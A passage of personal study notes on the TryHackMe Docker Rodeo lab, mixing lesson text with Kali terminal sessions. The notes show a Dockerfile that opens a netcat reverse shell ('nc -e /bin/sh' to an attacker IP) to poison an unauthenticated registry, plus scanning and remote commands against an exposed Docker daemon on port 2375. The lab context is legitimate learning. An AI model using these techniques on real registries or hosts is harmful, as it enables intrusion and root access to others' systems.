Got permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get "http://%2Fvar%2Frun%2Fdocker.sock/v1.24/images/json": dial unix /var/run/docker.sock: connect: permission denied
```
```text
┌──(kali㉿kali)-[~]
└─$ sudo docker images                                   
REPOSITORY                             TAG       IMAGE ID       CREATED         SIZE
blockchain-demo                        latest    aa0a2a620e24   2 months ago    183MB
node                                   alpine    16b18c065537   2 months ago    166MB
rustscan/rustscan                      latest    32635bbf7b6c   15 months ago   41.7MB
docker-rodeo.thm:5000/dive/challenge   latest    2a0a63ea5d88   2 years ago     111MB
docker-rodeo.thm:5000/dive/example     latest    398736241322   2 years ago     87.1MB
```
```text
┌──(kali㉿kali)-[~]
└─$ sudo dive 2a0a63ea5d88
Image Source: docker://2a0a63ea5d88
Fetching image... (this can take a while for large images)
Analyzing image...
Building cache...
```
What is the "IMAGE_ID" for the "challenge" Docker image that you just downloaded?
*2a0a63ea5d88*
![[Pasted image 20221025121022.png]]
Using Dive, how many "Layers" are there in this image?
*7*
![[Pasted image 20221025121241.png]]
![[Pasted image 20221025121211.png]]
What user is successfully added?
What command would you use to output a message on the command prompt?
*uogctf*
Continuing with exploiting the vulnerable Docker Registry from Task 3. "Abusing a Docker Registry", we can upload (or push) our own images to a repository, containing malicious code. Repositories can have as little or as many tags as the owners wish. However, every repository is guaranteed to have a "latest" tag. This tag is a copy of the latest upload of an image.
When a docker pull or docker run command is issued, Docker will first try to find a copy of the image (i.e. cmnatic/myapp1) on the host and then proceed to check if there have been any changes made on the Docker registry it was pulled from. If there are changes, Docker will download the updated image onto the host and then proceed to execute.
Without proper authentication, we can upload our own image to the target's registry. That way, the next time the owner runs a docker pull or docker run command, their host will download and execute our malicious image as it will be a new version for Docker.
The screenshot below is a "Dockerfile" that uses the Docker RUN instruction to execute "netcat" within the container to connect to our machine!
![](https://resources.cmnatic.co.uk/TryHackMe/rooms/docker-rodeo/malicious/reverseshell1.png)
We compile this into an image with docker build . Once compiled and added to the vulnerable registry, we set up a listener on our attacker machine and wait for the new image to be executed by the target.
![](https://resources.cmnatic.co.uk/TryHackMe/rooms/docker-rodeo/malicious/reverseshell2.png)
Note this will only grant us root access to the container using the image, and not the actual host - but it's a connection as root nonetheless. We can start to use these newly gained root privileges to look for configuration files, passwords or attempt to escape!
Additional reading: A Malicious DockerHub Image allowed attackers mine cryptocurrency
Note that there is no practical element to this task by design.
```text
┌──(kali㉿kali)-[~/docker_rodeo]
└─$ cat Dockerfile 
FROM debian:jessie-slim

RUN apt-get update -y
RUN apt-get install netcat -y

RUN nc -e /bin/sh 10.13.0.182 1337
```
```text
┌──(kali㉿kali)-[~/docker_rodeo]
└─$ sudo docker build .                                 
Sending build context to Docker daemon  2.048kB
Step 1/4 : FROM debian:jessie-slim
jessie-slim: Pulling from library/debian
3cf890347392: Pull complete 
Digest: sha256:b9b0e7354098cbd534861d7532c082fb81cdb4d893303ba1f322f52c9e583cd2
Status: Downloaded newer image for debian:jessie-slim
 ---> 2045588e2542
Step 2/4 : RUN apt-get update -y
 ---> Running in 9ee9ce48cf0e
Get:1 http://security.debian.org jessie/updates InRelease [44.9 kB]
Ign http://deb.debian.org jessie InRelease
Get:2 http://deb.debian.org jessie-updates InRelease [16.3 kB]
Get:3 http://deb.debian.org jessie Release.gpg [1652 B]
Get:4 http://deb.debian.org jessie Release [77.3 kB]
Get:5 http://security.debian.org jessie/updates/main amd64 Packages [992 kB]
Get:6 http://deb.debian.org jessie-updates/main amd64 Packages [20 B]
Get:7 http://deb.debian.org jessie/main amd64 Packages [9098 kB]
Fetched 10.2 MB in 12s (842 kB/s)
Reading package lists...
Removing intermediate container 9ee9ce48cf0e
 ---> 56de8c95c09f
Step 3/4 : RUN apt-get install netcat -y
 ---> Running in 3cf7181978b9
Reading package lists...
Building dependency tree...
Reading state information...
The following extra packages will be installed:
  netcat-traditional
The following NEW packages will be installed:
  netcat netcat-traditional
0 upgraded, 2 newly installed, 0 to remove and 0 not upgraded.
Need to get 75.3 kB of archives.
After this operation, 194 kB of additional disk space will be used.
Get:1 http://deb.debian.org/debian/ jessie/main netcat-traditional amd64 1.10-41 [66.3 kB]
Get:2 http://deb.debian.org/debian/ jessie/main netcat all 1.10-41 [8962 B]
debconf: delaying package configuration, since apt-utils is not installed
Fetched 75.3 kB in 0s (214 kB/s)                                                     
Selecting previously unselected package netcat-traditional.
(Reading database ... 7453 files and directories currently installed.)
Preparing to unpack .../netcat-traditional_1.10-41_amd64.deb ...
Unpacking netcat-traditional (1.10-41) ...
Selecting previously unselected package netcat.
Preparing to unpack .../netcat_1.10-41_all.deb ...
Unpacking netcat (1.10-41) ...
Setting up netcat-traditional (1.10-41) ...
update-alternatives: using /bin/nc.traditional to provide /bin/nc (nc) in auto mode
update-alternatives: warning: skip creation of /usr/share/man/man1/nc.1.gz because associated file /usr/share/man/man1/nc.traditional.1.gz (of link group nc) doesn't exist
update-alternatives: warning: skip creation of /usr/share/man/man1/netcat.1.gz because associated file /usr/share/man/man1/nc.traditional.1.gz (of link group nc) doesn't exist
Setting up netcat (1.10-41) ...
Removing intermediate container 3cf7181978b9
 ---> 23337f1e3b6f
Step 4/4 : RUN nc -e /bin/sh 10.13.0.182 1337
 ---> Running in e97f9db86341
```
```text
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 1337      
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
```
```text
┌──(kali㉿kali)-[~/docker_rodeo]
└─$ sudo docker build .
Sending build context to Docker daemon  2.048kB
Step 1/4 : FROM debian:jessie-slim
 ---> 2045588e2542
Step 2/4 : RUN apt-get update -y
 ---> Using cache
 ---> 56de8c95c09f
Step 3/4 : RUN apt-get install netcat -y
 ---> Using cache
 ---> 23337f1e3b6f
Step 4/4 : RUN nc -e /bin/sh 10.13.0.182 1337
 ---> Running in 3102bd6c30f5
```
```text
┌──(kali㉿kali)-[~/docker_rodeo]
└─$ sudo docker images 
REPOSITORY                             TAG           IMAGE ID       CREATED         SIZE
<none>                                 <none>        23337f1e3b6f   4 minutes ago   92.6MB

to remove a docker image, first remove the container and stop docker service

https://www.digitalocean.com/community/tutorials/how-to-remove-docker-images-containers-and-volumes

Stopping Service
```
```text
┌──(kali㉿kali)-[~/docker_rodeo]
└─$ sudo systemctl stop docker  
Warning: Stopping docker.service, but it can still be activated by:
  docker.socket

Getting docker containers
```
```text
┌──(kali㉿kali)-[~/docker_rodeo]
└─$ sudo docker ps -a                                    
CONTAINER ID   IMAGE                    COMMAND                  CREATED         STATUS                      PORTS     NAMES
e97f9db86341   23337f1e3b6f             "/bin/sh -c 'nc -e /…"   9 minutes ago   Exited (1) 7 minutes ago              suspicious_ardinghelli
b154d1c7b280   blockchain-demo:latest   "docker-entrypoint.s…"   2 months ago    Exited (137) 2 months ago             blockchain-demo-master_blockchain-demo_1

Removing container
```
```text
┌──(kali㉿kali)-[~/docker_rodeo]
└─$ sudo docker rm e97f9db86341 
e97f9db86341
```
```text
┌──(kali㉿kali)-[~/docker_rodeo]
└─$ sudo docker ps -a          
CONTAINER ID   IMAGE                    COMMAND                  CREATED        STATUS                      PORTS     NAMES
b154d1c7b280   blockchain-demo:latest   "docker-entrypoint.s…"   2 months ago   Exited (137) 2 months ago             blockchain-demo-master_blockchain-demo_1

Getting images
```
```text
┌──(kali㉿kali)-[~/docker_rodeo]
└─$ sudo docker images   
REPOSITORY                             TAG           IMAGE ID       CREATED          SIZE
<none>                                 <none>        23337f1e3b6f   13 minutes ago   92.6MB
blockchain-demo                        latest        aa0a2a620e24   2 months ago     183MB
node                                   alpine        16b18c065537   2 months ago     166MB
rustscan/rustscan                      latest        32635bbf7b6c   15 months ago    41.7MB
debian                                 jessie-slim   2045588e2542   19 months ago    81.4MB
docker-rodeo.thm:5000/dive/challenge   latest        2a0a63ea5d88   2 years ago      111MB
docker-rodeo.thm:5000/dive/example     latest        398736241322   2 years ago      87.1MB

Removing imagen that I've just created
```
```text
┌──(kali㉿kali)-[~/docker_rodeo]
└─$ sudo docker rmi 23337f1e3b6f    

Deleted: sha256:23337f1e3b6f6520723ec946a8a5e8142636b5278913cf5d9e9912b3702d4d23
Deleted: sha256:4f6a71a17af6638193e9423a072e1307a70a4b0e35bdbd5728c6daa4a4dfac2f
Deleted: sha256:56de8c95c09f75d3c8c0a6245d56f897ac9965fb447b7b6a67aab62995cbc43e
Deleted: sha256:f805c73fb594793f266637387648cb5840024e53d40add1465f0817d06d3b6b7
```
```text
┌──(kali㉿kali)-[~/docker_rodeo]
└─$ sudo docker images          
REPOSITORY                             TAG           IMAGE ID       CREATED         SIZE
blockchain-demo                        latest        aa0a2a620e24   2 months ago    183MB
node                                   alpine        16b18c065537   2 months ago    166MB
rustscan/rustscan                      latest        32635bbf7b6c   15 months ago   41.7MB
debian                                 jessie-slim   2045588e2542   19 months ago   81.4MB
docker-rodeo.thm:5000/dive/challenge   latest        2a0a63ea5d88   2 years ago     111MB
docker-rodeo.thm:5000/dive/example     latest        398736241322   2 years ago     87.1MB

Yep it works!

Now start service
```
```text
┌──(kali㉿kali)-[~/docker_rodeo]
└─$ sudo systemctl start docker
```
https://www.trendmicro.com/vinfo/us/security/news/virtualization-and-cloud/malicious-docker-hub-container-images-cryptocurrency-mining
I've learnt that we can publish images with malicious code such as reverse shells to our vulnerable Docker registry.
6.1. Unix Sockets 101 (no travel adapter required)
If I were to mention the word "socket" you would most likely think of networking, right? Well, you're not wrong in doing so. With that said, what is often seldom discussed is UNIX sockets...Put simply, a UNIX socket accomplishes the same job as it's networking sibling - moving data, albeit all within the host itself by using the filesystem rather than networking interfaces/adapters; Interprocess Communication (IPC) is an essential part to an operating system. Due to the fact that UNIX sockets use the filesystem directly, you can use filesystem permissions to decide who or what can read/write.
There was an interesting [benchmark test](https://www.percona.com/blog/2020/04/13/need-to-connect-to-a-local-mysql-server-use-unix-domain-socket/) between using both types of sockets for querying a MySQL database. Notice in the screenshot below how there are an incredibly higher amount of queries performed when using UNIX sockets; database systems such as Redis are known for their performance due to this reason.
![](https://www.percona.com/blog/wp-content/uploads/2020/04/image2-2.png)
6.2. How does this pertain to Docker?
Users interact with Docker by using the Docker Engine. For example, commands such as docker pull or docker run will be executed by the use of a socket - this can either be a UNIX or a TCP socket, but by default, it is a UNIX socket. This is why you must be a part of the "docker" group to use the docker command (remembering that UNIX sockets can use file permissions here!) as illustrated below:
The user "cmnatic" is in the "docker" group
![](https://assets.tryhackme.com/additional/docker-rodeo/dockerapi/groups1.png)
And can therefore run commands like docker images
![](https://assets.tryhackme.com/additional/docker-rodeo/dockerapi/groups2.png)
Whereas, the user "notcmnatic" is not in the "docker" group and cannot run Docker commands due to lack of permissions to the Docker socket.
![](https://assets.tryhackme.com/additional/docker-rodeo/dockerapi/groups4.png)
![](https://assets.tryhackme.com/additional/docker-rodeo/dockerapi/groups3.png)
6.3. Automating all the things
Developers love to automate, and this is proven nonetheless with Docker. Whilst Docker uses a UNIX socket, meaning that it can only interact from the host itself. However, someone may wish to remotely execute Docker commands such as in Docker management tools like Portainer or DevOps applications like Jenkins to test their program.
To achieve this, the daemon must use a TCP socket instead, permitting data for the Docker daemon to be communicated using the network interface and ultimately exposing it to the network for us to exploit.
Transmission Control Protocol (TCP) is a connection-oriented protocol requiring a TCP three-way-handshake to establish a connection. TCP provides reliable data transfer, flow control and congestion control. Higher-level protocols such as HTTP, POP3, IMAP and SMTP use TCP
6.4. Practical:
6.4.1. Enumerate, enumerate, enumerate...
We'll need to enumerate the host to look for this exposed service. By default, the engine will run on port 2375 - let's confirm this by performing another Nmap scan against your Instance (10.10.153.100).
Please note that you may need to upgrade your version of Nmap (or proceed to "Step 2") if this port does not appear in your Nmap scan.
![](https://assets.tryhackme.com/additional/docker-rodeo/dockerapi/nmap1.png)
```text
┌──(kali㉿kali)-[/etc/docker]
└─$ rustscan -a 10.10.153.100 --ulimit 5500 -b 65535 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.153.100:22
Open 10.10.153.100:2244
Open 10.10.153.100:2255
Open 10.10.153.100:2233
Open 10.10.153.100:2375
Open 10.10.153.100:5000
Open 10.10.153.100:7000
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-25 20:50 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:50
Completed NSE at 20:50, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:50
Completed NSE at 20:50, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:50
Completed NSE at 20:50, 0.00s elapsed
Initiating Ping Scan at 20:50
Scanning 10.10.153.100 [2 ports]
Completed Ping Scan at 20:50, 0.32s elapsed (1 total hosts)
Initiating Connect Scan at 20:50
Scanning docker-rodeo.thm (10.10.153.100) [7 ports]
Discovered open port 22/tcp on 10.10.153.100
Discovered open port 5000/tcp on 10.10.153.100
Discovered open port 2375/tcp on 10.10.153.100
Discovered open port 7000/tcp on 10.10.153.100
Discovered open port 2255/tcp on 10.10.153.100
Discovered open port 2244/tcp on 10.10.153.100
Discovered open port 2233/tcp on 10.10.153.100
Completed Connect Scan at 20:50, 0.31s elapsed (7 total ports)
Initiating Service scan at 20:50
Scanning 7 services on docker-rodeo.thm (10.10.153.100)
Completed Service scan at 20:51, 45.91s elapsed (7 services on 1 host)
NSE: Script scanning 10.10.153.100.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:51
Completed NSE at 20:51, 11.46s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:51
Completed NSE at 20:51, 1.37s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:51
Completed NSE at 20:51, 0.00s elapsed
Nmap scan report for docker-rodeo.thm (10.10.153.100)
Host is up, received conn-refused (0.31s latency).
Scanned at 2022-10-25 20:50:19 EDT for 59s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fdd039ac0608f28fc301bc5394a381dd (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCyWJO/e6RoZm8B/GvOqyKXF8yOm5tw/DMPw6CwkMyxJv1IITVDg7vRmvEpL5gd7nmf+8z9V2w56p0Y9IoRB6yUd2pGxPnxLnzn+tkmR/kbFkXwKCiHM9p+0rf2Z/B16JyMyLY4BzmGmDWaBTutFgfqYMrJ5yRgM9Uqo1GF1cb2BUoPjgusafPYNpRU3c2hXaVvOwKx0oXtHKmyVcmH1geRsOQ5evZowvowetbDLYf+X8+BkGJ6h6ge5K0y+E1SOatumwKtXs9P3UjzCvmZLeYInJvQeHtyzWG96aZooAUQFJ04sS+LHYINSbm4uDcOILRx8hadhj8meGX76KamOrjT
|   256 36624b1f9b3c6f22cca93aae987a3ed3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEkuuS2jOZTEaQKxb5P12mhLDDpyrNRuytd810EFMewKuNfwka5ARI4lraPda+T2s3tpkWYNcfKJr2bCelmV7Xc=
|   256 f2cb82b5bae6f086cdb53061e4d3ca96 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPrpwpt6doF7ocHG14+wUzL/r5cooC5ef30WDqXZDWag
2233/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 0699f6a0b93f8441d154fdafba13686c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCiRwKcIWTfA6BN5G46wzJ2WEGp0g8PFJyLOvJwDZAw8uaItzJUt9VtfZBF69Mm9MqTcnHDnH4Z8FocY1TU9DwJRxctIEvmiTxncjJcHIliI27XwgQxWoYM7aPkHVQCiqpawyftNkes59flfKqiA8i7aVz/a9WVv3pEWoJfKgDTw+zaFba9fbnqTPeUZVhKVxuWuftdUp9dtoUcGyui2DaUrTPTb6ZySihkIjlTfjjbZjY90H1ukv1vs7/ebIDgc35p7/1F6jYSGUn0xsTfLH18u2ensDkHqzzsR7NntkY7K1m1iR9cyZ2ss93b4hm4EC+ChfzsEJnwy0JaB0qztFE7
|   256 9269574236a5c6499634b09a86486dae (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPi5xfZGsTO2qlTRLii2yDxNhpBTdJ/zHCK25b+POUaysl/zcXDY7dmRFyHRcdgFVZDF8mzqWJMAzOdQVtyBz8s=
|   256 c15fd6962d28b8d4f50f4d6a60b6b93c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN++8fEn7VV2VkKnyrUoupCho0NQidPDQ4wGTMDBUmnC
2244/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1968632c1b344d61951565ae1f1a48f3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDML947breANePfvUVjI5Who3YnozxtqPfSWYElIDI7mgxzpn1hJSZnY17VEvBi90PRjkg7X2l1nCKX48A7wyY4rkLGTBO/sMLVrylbQDVOG5RPG4vmnZXs3acRwRr5m15YV7OEYc6WycQaMaElUfy06WQI+cCv9wGUV0Xkz4xN+gDT0r34KLUEHrzN1R478QxoRX+rrAdHj6j6vDXCizGwWBPqJSeOBz7mspgVSN0aYjyN0EEPGi7MOmkL1i6E2Pvv17g4Zv7XD7UVzu+eSZzOt0wjPVgwkFXapYK7wnA5Rq3EEX/61EszSw4c+sgLEuGWjIY8I3Mo/IZqY/jCPozj
|   256 81c81a94a329a700338980e735b676de (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOZqllWCjU44z6Ho/Klb55xcniFu7VomYL0mtptJjIIJMH+XeCJ7USG+BWA/OM6qfSkOpmHRqQyWmq5tukju+2s=
|   256 799eff97f16c151569a760d55c9b77a4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINCxlu7Ftjbaq1lJ/2b2XmExm6tI/DewMAVvT6A8VvsE
2255/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 0699f6a0b93f8441d154fdafba13686c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCiRwKcIWTfA6BN5G46wzJ2WEGp0g8PFJyLOvJwDZAw8uaItzJUt9VtfZBF69Mm9MqTcnHDnH4Z8FocY1TU9DwJRxctIEvmiTxncjJcHIliI27XwgQxWoYM7aPkHVQCiqpawyftNkes59flfKqiA8i7aVz/a9WVv3pEWoJfKgDTw+zaFba9fbnqTPeUZVhKVxuWuftdUp9dtoUcGyui2DaUrTPTb6ZySihkIjlTfjjbZjY90H1ukv1vs7/ebIDgc35p7/1F6jYSGUn0xsTfLH18u2ensDkHqzzsR7NntkY7K1m1iR9cyZ2ss93b4hm4EC+ChfzsEJnwy0JaB0qztFE7
|   256 9269574236a5c6499634b09a86486dae (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPi5xfZGsTO2qlTRLii2yDxNhpBTdJ/zHCK25b+POUaysl/zcXDY7dmRFyHRcdgFVZDF8mzqWJMAzOdQVtyBz8s=
|   256 c15fd6962d28b8d4f50f4d6a60b6b93c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN++8fEn7VV2VkKnyrUoupCho0NQidPDQ4wGTMDBUmnC
2375/tcp open  docker  syn-ack Docker 19.03.13 (API 1.40)
| docker-version: 
|   GitCommit: 4484c46d9d
|   Os: linux
|   Version: 19.03.13
|   GoVersion: go1.13.15
|   KernelVersion: 4.15.0-123-generic
|   MinAPIVersion: 1.12
|   ApiVersion: 1.40
|   Arch: amd64
|   Components: 
|     
|       Version: 19.03.13
|       Details: 
|         Experimental: false
|         GitCommit: 4484c46d9d
|         Os: linux
|         GoVersion: go1.13.15
|         KernelVersion: 4.15.0-123-generic
|         MinAPIVersion: 1.12
|         Arch: amd64
|         BuildTime: 2020-09-16T17:01:06.000000000+00:00
|         ApiVersion: 1.40
|       Name: Engine
|     
|       Version: 1.3.7
|       Details: 
|         GitCommit: 8fba4e9a7d01810a393d5d25a3621dc101981175
|       Name: containerd
|     
|       Version: 1.0.0-rc10
|       Details: 
|         GitCommit: dc9208a3303feef5b3839f4323d9beb36df0a9dd
|       Name: runc
|     
|       Version: 0.18.0
|       Details: 
|         GitCommit: fec3683
|       Name: docker-init
|   BuildTime: 2020-09-16T17:01:06.000000000+00:00
|   Platform: 
|_    Name: Docker Engine - Community
5000/tcp open  http    syn-ack Docker Registry (API: 2.0)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title.
7000/tcp open  http    syn-ack Docker Registry (API: 2.0)
|_http-title: Site doesn't have a title.
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OSs: Linux, linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:51
Completed NSE at 20:51, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:51
Completed NSE at 20:51, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:51
Completed NSE at 20:51, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.71 seconds
```
6.4.2. Confirming vulnerability.
Great! Looks like it's open, we're going to use the curl command to start interacting with the exposed Docker daemon.
Confirming that we can access the Docker daemon:
curl http://10.10.153.100:2375/version
And note that we receive a response will all sorts of data about the host - lovely!
![](https://assets.tryhackme.com/additional/docker-rodeo/dockerapi/curl1.png)
```text
┌──(kali㉿kali)-[/etc/docker]
└─$ curl http://10.10.153.100:2375/version    
{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"19.03.13","Details":{"ApiVersion":"1.40","Arch":"amd64","BuildTime":"2020-09-16T17:01:06.000000000+00:00","Experimental":"false","GitCommit":"4484c46d9d","GoVersion":"go1.13.15","KernelVersion":"4.15.0-123-generic","MinAPIVersion":"1.12","Os":"linux"}},{"Name":"containerd","Version":"1.3.7","Details":{"GitCommit":"8fba4e9a7d01810a393d5d25a3621dc101981175"}},{"Name":"runc","Version":"1.0.0-rc10","Details":{"GitCommit":"dc9208a3303feef5b3839f4323d9beb36df0a9dd"}},{"Name":"docker-init","Version":"0.18.0","Details":{"GitCommit":"fec3683"}}],"Version":"19.03.13","ApiVersion":"1.40","MinAPIVersion":"1.12","GitCommit":"4484c46d9d","GoVersion":"go1.13.15","Os":"linux","Arch":"amd64","KernelVersion":"4.15.0-123-generic","BuildTime":"2020-09-16T17:01:06.000000000+00:00"}
```
6.4.3. Execute
We'll perform our first Docker command by using the "-H" switch to specify the Instance to list the containers running docker -H tcp://10.10.153.100:2375 ps
![](https://assets.tryhackme.com/additional/docker-rodeo/dockerapi/docker1.png)
```text
┌──(kali㉿kali)-[~/docker_rodeo]
└─$ sudo docker ps -a          
CONTAINER ID   IMAGE                    COMMAND                  CREATED        STATUS                      PORTS     NAMES
b154d1c7b280   blockchain-demo:latest   "docker-entrypoint.s…"   2 months ago   Exited (137) 2 months ago             blockchain-demo-master_blockchain-demo_1
```
```text
┌──(kali㉿kali)-[~/docker_rodeo]
└─$ sudo docker -H tcp://10.10.153.100:2375 ps
CONTAINER ID   IMAGE                  COMMAND                  CREATED         STATUS          PORTS                    NAMES
63b932f4d7d2   privileged-container   "/usr/sbin/sshd -D"      23 months ago   Up 10 minutes   0.0.0.0:2244->22/tcp     musing_stonebraker
2b28b54f56f6   namespaces             "/usr/sbin/sshd -D"      23 months ago   Up 10 minutes   0.0.0.0:2255->22/tcp     goofy_diffie
3d8fe1db6635   container-socket       "/usr/sbin/sshd -D"      23 months ago   Up 10 minutes   0.0.0.0:2233->22/tcp     brave_mendel
fd1d7cc1b972   registry:2             "/entrypoint.sh /etc…"   2 years ago     Up 10 minutes   0.0.0.0:5000->5000/tcp   registry_example-registry_1
c5bd077f9ddb   registry:2             "/entrypoint.sh /etc…"   2 years ago     Up 10 minutes   0.0.0.0:7000->5000/tcp   registry_actual-registry-1_1
```
6.4.4. Experiment
Of course, listing the running containers is the least that we can do at this stage. We can start to create our own, extract their filesystems and look for data, or execute commands on the host itself. Here are a few docker commands that I'll leave for you to experiment with:
Command
Description
network ls
Used to list the networks of containers, we could use this to discover other applications running and pivot to them from our machine!
images
List images used by containers, data can also be exfiltrated by reverse-engineering the image.
exec
Execute a command on a container
run
Run a container
Experiment with some [Docker commands](https://raw.githubusercontent.com/sangam14/dockercheatsheets/master/dockercheatsheet8.png) to enumerate the machine, try to gain a shell onto some of the containers and take a look at using tools such as [rootplease](https://registry.hub.docker.com/r/chrisfosterelli/rootplease) to use Docker to create a root shell on the device itself.
```text
┌──(kali㉿kali)-[~/docker_rodeo]
└─$ sudo systemctl stop docker 
Warning: Stopping docker.service, but it can still be activated by:
  docker.socket
```
```text
┌──(kali㉿kali)-[~/docker_rodeo]
└─$ sudo docker stop b154d1c7b280
b154d1c7b280
```
```text
┌──(kali㉿kali)-[~/docker_rodeo]
└─$ sudo docker ps -a            
CONTAINER ID   IMAGE                    COMMAND                  CREATED        STATUS                      PORTS     NAMES
b154d1c7b280   blockchain-demo:latest   "docker-entrypoint.s…"   2 months ago   Exited (137) 2 months ago             blockchain-demo-master_blockchain-demo_1
```
```text
┌──(kali㉿kali)-[~/docker_rodeo]
└─$ sudo docker ps   
CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES
```
```text
┌──(kali㉿kali)-[~/docker_rodeo]
└─$ sudo systemctl start docker
```
```text
┌──(kali㉿kali)-[~/docker_rodeo]
└─$ docker --version 
Docker version 20.10.17+dfsg1, build 100c701
```
```text
┌──(kali㉿kali)-[~/docker_rodeo]
└─$ sudo docker ps -a                         
CONTAINER ID   IMAGE                    COMMAND                  CREATED        STATUS                      PORTS     NAMES
b154d1c7b280   blockchain-demo:latest   "docker-entrypoint.s…"   2 months ago   Exited (137) 2 months ago             blockchain-demo-master_blockchain-demo_1
```
```text
┌──(kali㉿kali)-[~/docker_rodeo]
└─$ sudo docker logs b154d1c7b280 
GET /hash 200 1034.292 ms - 2701
GET /stylesheets/lib/bootstrap.min.css 200 9.899 ms - 121200
GET /stylesheets/lib/bootstrap-theme.min.css 200 15.981 ms - 23409
GET /stylesheets/lib/bootstrap-horizon.css 200 16.574 ms - 2728
GET /stylesheets/lib/ladda-themeless.min.css 200 17.034 ms - 7710
GET /stylesheets/blockchain.css 200 16.680 ms - 586
GET /stylesheets/lib/ie10-viewport-bug-workaround.css 200 23.779 ms - 430
GET /javascripts/lib/jquery.min.js 200 25.380 ms - 84345
GET /javascripts/lib/bootstrap.min.js 200 19.398 ms - 37045
GET /javascripts/lib/spin.min.js 200 19.368 ms - 4123
GET /javascripts/lib/ladda.min.js 200 20.040 ms - 3194
GET /javascripts/lib/ie10-viewport-bug-workaround.js 200 19.841 ms - 641
GET /javascripts/lib/sha256.js 200 19.398 ms - 4608
GET /javascripts/blockchain.js 200 4.748 ms - 2069
GET /block 200 416.330 ms - 4215
GET /stylesheets/lib/bootstrap.min.css 304 1.987 ms - -
GET /stylesheets/lib/bootstrap-theme.min.css 304 1.557 ms - -
GET /stylesheets/lib/bootstrap-horizon.css 304 1.343 ms - -
GET /stylesheets/lib/ladda-themeless.min.css 304 3.406 ms - -
GET /stylesheets/lib/ie10-viewport-bug-workaround.css 304 2.692 ms - -
GET /stylesheets/blockchain.css 304 4.630 ms - -
GET /javascripts/lib/jquery.min.js 304 5.663 ms - -
GET /javascripts/lib/bootstrap.min.js 304 5.865 ms - -
GET /javascripts/lib/spin.min.js 304 2.849 ms - -
GET /javascripts/lib/ladda.min.js 304 3.695 ms - -
GET /javascripts/lib/ie10-viewport-bug-workaround.js 304 3.061 ms - -
GET /javascripts/lib/sha256.js 304 1.068 ms - -
GET /javascripts/blockchain.js 304 1.570 ms - -
GET /blockchain 200 663.761 ms - 11179
GET /stylesheets/lib/bootstrap.min.css 304 1.526 ms - -
GET /stylesheets/lib/bootstrap-theme.min.css 304 1.258 ms - -
GET /stylesheets/lib/bootstrap-horizon.css 304 2.267 ms - -
